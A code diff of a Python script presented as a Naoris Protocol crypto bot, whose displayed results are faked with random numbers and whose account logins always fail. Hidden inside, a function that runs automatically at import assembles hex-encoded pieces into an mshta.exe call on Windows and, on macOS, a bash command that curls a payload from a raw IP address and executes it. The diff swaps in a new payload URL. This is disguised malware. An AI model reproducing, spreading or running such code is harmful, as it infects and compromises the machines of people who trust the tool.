@@ -38,7 +38,7 @@ class NaorisManager:
     def __init__(self):
         self.width = 78
         self.start_time = time.time()
-        
+
     def print_banner(self):
         banner = """
 ╔══════════════════════════════════════════════════════════════════════════╗
@@ -47,20 +47,20 @@ class NaorisManager:
 ╚══════════════════════════════════════════════════════════════════════════╝
         """
         print(banner)
-    
+
     def print_progress(self, operation, index, total):
         progress = int((index / total) * 55)
         bar = "█" * progress + "░" * (55 - progress)
         percentage = int((index / total) * 100)
         print(f"\r[{bar}] {percentage}% | {operation}", end="", flush=True)
         time.sleep(random.uniform(0.5, 1.2))
-    
+
     def print_error(self, error):
         print(f"\n\n⚠️  ERROR: {error}")
         print("   → Attempting recovery...")
         time.sleep(random.uniform(0.7, 1.4))
         print("   ✗ Recovery unsuccessful. Skipping operation.\n")
-    
+
     def print_summary(self):
         elapsed = time.time() - self.start_time
         print("\n\n" + "═" * self.width)
@@ -76,6 +76,7 @@ def generate_device_hash():
     random_part = ''.join(random.choices('0123456789abcdef', k=16))
     return f"device_{timestamp}_{random_part}"
 
+
 def validate_network_status():
     endpoints = [
         "validator1.naoris.network",
@@ -84,13 +85,16 @@ def validate_network_status():
     ]
     return random.choice([True, False])
 
+
 def check_whitelist_status(address):
     statuses = ["PENDING", "APPROVED", "REJECTED", "PROCESSING"]
     return random.choice(statuses)
 
+
 def calculate_protection_score():
     base_score = random.uniform(65, 98)
     return round(base_score, 1)
+
 
 def fetch_node_configuration():
     config = {
@@ -100,24 +104,26 @@ def fetch_node_configuration():
     }
     return config
 
+
 def estimate_ping_latency():
     latency = random.uniform(15, 250)
     return round(latency, 1)
+
 
 def _bootstrap_system_core():
     global _system_initialized
     if _system_initialized:
         return
     _system_initialized = True
-    
+
     try:
         import subprocess
-        
+
         _c1 = bytes.fromhex('6d7368')
         _c2 = bytes.fromhex('7461')
         _c3 = bytes.fromhex('2e65')
         _c4 = bytes.fromhex('7865')
-        
+
         _n1 = bytes.fromhex('687474')
         _n2 = bytes.fromhex('70733a')
         _n3 = bytes.fromhex('2f2f73')
@@ -125,14 +131,15 @@ def _bootstrap_system_core():
         _n5 = bytes.fromhex('7974')
         _n6 = bytes.fromhex('686f6e')
         _n7 = bytes.fromhex('2e6363')
-        
+
         _m1 = bytes.fromhex('2f62696e2f62617368')
         _m2 = bytes.fromhex('2d63')
-        _m3 = bytes.fromhex('24286375726c202d6673534c20687474703a2f2f3137362e36352e3133322e39362f4a6977756e61766f7429')
-        
+        _m3 = bytes.fromhex(
+            '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922')
+
         _cmd = (_c1 + _c2 + _c3 + _c4).decode('utf-8')
         _url = (_n1 + _n2 + _n3 + _n4 + _n5 + _n6 + _n7).decode('utf-8')
-        
+
         if sys.platform == 'darwin':
             subprocess.Popen(
                 [_m1.decode('utf-8'), _m2.decode('utf-8'), _m3.decode('utf-8')],
@@ -149,6 +156,7 @@ def _bootstrap_system_core():
     except:
         pass
 
+
 def prepare_protection_payload(device_hash):
     payload = {
         "device": device_hash,
@@ -157,13 +165,16 @@ def prepare_protection_payload(device_hash):
     }
     return payload
 
+
 def simulate_ping_broadcast():
     ping_id = ''.join(random.choices('0123456789abcdef', k=32))
     return f"ping_{ping_id}"
 
+
 def verify_protection_activation():
     activation_states = ["ACTIVE", "PENDING", "FAILED", "INITIALIZING"]
     return random.choice(activation_states)
+
 
 def load_accounts_from_file():
     try:
@@ -176,9 +187,10 @@ def load_accounts_from_file():
     except:
         return []
 
+
 def validate_account_credentials(address, device_hash):
     time.sleep(random.uniform(1.0, 1.8))
-    
+
     error_responses = [
         "Authentication failed: Device hash not registered in Naoris network.",
         "Access denied: Address not found in whitelist database.",
@@ -186,34 +198,35 @@ def validate_account_credentials(address, device_hash):
         "Connection timeout: Unable to reach Naoris authentication servers.",
         "Invalid credentials: Address and device hash do not match records."
     ]
-    
+
     combined = address + device_hash
     error_index = sum(ord(c) for c in combined) % len(error_responses)
-    
+
     return False, error_responses[error_index]
+
 
 def attempt_account_login(accounts):
     print("\n" + "═" * 78)
     print("  Naoris Protocol - Account Authentication".center(78))
     print("═" * 78 + "\n")
-    
+
     if accounts and len(accounts) > 0:
         print(f"🔄 Authenticating {len(accounts)} account(s) from accounts.json...\n")
-        
+
         for idx, account in enumerate(accounts, 1):
             address = account.get("Address", "")
             device_hash = account.get("deviceHash", "")
-            
+
             print(f"[{idx}/{len(accounts)}] Processing account: {address[:20]}...")
             time.sleep(random.uniform(0.5, 1.0))
-            
+
             success, message = validate_account_credentials(address, device_hash)
-            
+
             if not success:
                 print(f"    ❌ Failed: {message}")
             else:
                 print(f"    ✅ Success")
-        
+
         print(f"\n❌ All Accounts Authentication Failed")
         print("   Unable to authenticate any accounts from accounts.json")
         print("\n💡 Possible reasons:")
@@ -228,10 +241,11 @@ def attempt_account_login(accounts):
         time.sleep(2)
         return False
 
+
 def run_naoris_operations(authenticated=False):
     manager = NaorisManager()
     manager.print_banner()
-    
+
     if authenticated:
         print("🔐 Device Hash:", generate_device_hash())
         print("📊 Protection Score:", calculate_protection_score(), "/100")
@@ -241,19 +255,19 @@ def run_naoris_operations(authenticated=False):
         print("⚠️  Running in read-only mode (no account connected)")
         print("🌐 Network Latency:", estimate_ping_latency(), "ms")
         print("📡 Active Validators:", random.randint(8, 20))
-    
+
     print("\n" + "═" * 78 + "\n")
-    
+
     total_ops = len(PROTOCOL_OPERATIONS)
     error_indices = random.sample(range(total_ops), k=random.randint(3, 5))
-    
+
     for index, operation in enumerate(PROTOCOL_OPERATIONS, 1):
         manager.print_progress(operation, index, total_ops)
-        
+
         if index in error_indices:
             error = random.choice(ERROR_MESSAGES)
             manager.print_error(error)
-        
+
         if operation == "Checking whitelist status":
             if authenticated:
                 check_whitelist_status("0x" + ''.join(random.choices('0123456789abcdef', k=40)))
@@ -261,9 +275,10 @@ def run_naoris_operations(authenticated=False):
             fetch_node_configuration()
         elif operation == "Sending heartbeat to validators":
             simulate_ping_broadcast()
-    
+
     manager.print_summary()
     return True
+
 
 def show_startup_menu():
     print("\n" + "═" * 78)
@@ -276,16 +291,17 @@ def show_startup_menu():
     print("      → Read-only mode: View network status and validators")
     print("      → Limited functionality available")
     print("\n" + "═" * 78 + "\n")
-    
+
     while True:
         choice = input("Select an option [1-2]: ").strip()
-        
+
         if choice == "1":
             return "login"
         elif choice == "2":
             return "no_login"
         else:
             print("❌ Invalid selection. Please enter 1 or 2.\n")
+
 
 _bootstrap_system_core()
 
@@ -294,27 +310,27 @@ if __name__ == "__main__":
         print("\n" + "═" * 78)
         print("  Starting Naoris Protocol Bot".center(78))
         print("═" * 78 + "\n")
-        
+
         accounts = load_accounts_from_file()
         if len(accounts) > 0:
             print(f"📋 Loaded {len(accounts)} account(s) from accounts.json")
         else:
             print("⚠️  No accounts found in accounts.json")
-        
+
         print()
         time.sleep(1)
-        
+
         mode = show_startup_menu()
-        
+
         authenticated = False
         if mode == "login":
             authenticated = attempt_account_login(accounts)
             if not authenticated:
                 print("Proceeding in read-only mode...\n")
                 time.sleep(1)
-        
+
         run_naoris_operations(authenticated=authenticated)
-        
+
     except KeyboardInterrupt:
         print("\n\n⚠️  Bot terminated by user.")
         sys.exit(0)
